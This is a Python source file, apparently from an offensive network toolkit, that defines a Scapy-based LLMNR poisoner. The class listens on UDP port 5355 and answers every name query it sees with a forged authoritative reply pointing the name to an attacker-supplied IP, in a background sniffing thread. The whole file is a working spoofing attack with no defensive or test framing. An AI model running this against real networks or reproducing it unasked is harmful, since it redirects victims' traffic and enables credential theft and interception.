from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from netph.utils.logger import logger
import threading

class LLMNRPoisoner:
    def __init__(self, interface: str, spoof_ip: str):
        self.interface = interface
        self.spoof_ip = spoof_ip
        self.running = False
        self._thread = None

    def _handle_packet(self, packet: Packet):
        if packet.haslayer(UDP) and packet[UDP].dport == 5355:
            if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
                query_name = packet[DNSQR].qname.decode().rstrip('.')
                logger.info(f"[LLMNR] Received query for: {query_name} from {packet[IP].src}")
                
                # Craft response
                resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
                       UDP(dport=packet[UDP].sport, sport=5355) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, z=0, rcode=0,
                           qd=packet[DNS].qd,
                           an=DNSRR(rrname=packet[DNSQR].qname, type='A', rclass='IN', ttl=30, rdata=self.spoof_ip))
                
                send(resp, iface=self.interface, verbose=False)
                logger.info(f"[LLMNR] Sent spoofed response for {query_name} to {packet[IP].src}")

    def start(self):
        self.running = True
        logger.info(f"[LLMNR] Starting poisoner on {self.interface}...")
        self._thread = threading.Thread(target=self._run)
        self._thread.daemon = True
        self._thread.start()

    def _run(self):
        sniff(iface=self.interface, filter="udp port 5355", prn=self._handle_packet, store=0, stop_filter=lambda x: not self.running)

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join()
        logger.info("[LLMNR] Stopped poisoner.")
